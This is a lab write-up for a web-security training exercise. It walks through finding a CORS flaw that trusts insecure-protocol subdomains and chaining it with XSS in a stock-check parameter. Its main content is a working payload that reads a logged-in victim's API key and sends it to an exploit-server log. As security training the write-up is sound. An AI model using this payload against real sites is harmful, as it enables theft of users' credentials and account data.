# Lab: CORS vulnerability with trusted insecure protocols

Log in and notice that the user's api key is displayed on the account page. Check the proxy history to see that the /my-account request makes a request to /accountDetails to retrieve this information. Send the request to the repeater and add the header `Origin: http://<lab-subdomain>.web-security-academy.net`. Notice that the response reflects the origin in the `Access-Control-Allow-Origin` header, indicating that there is a CORS vulnerability.

Open a product page and notice that the check stock productId parameter is vulnerable to XSS.

Use the following script to deliver to the victim via the exploit server, where the target website is accessed and logged on the malicious server:
```
<script>
    document.location="http://stock.ac311f2d1f1d9690c0615eb100c6002b.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ac311f2d1f1d9690c0615eb100c6002b.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-ac1a1fc61f4c9619c0ef5e7401380009.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

Check the access log to see the response and find the api key. Submit to complete the lab.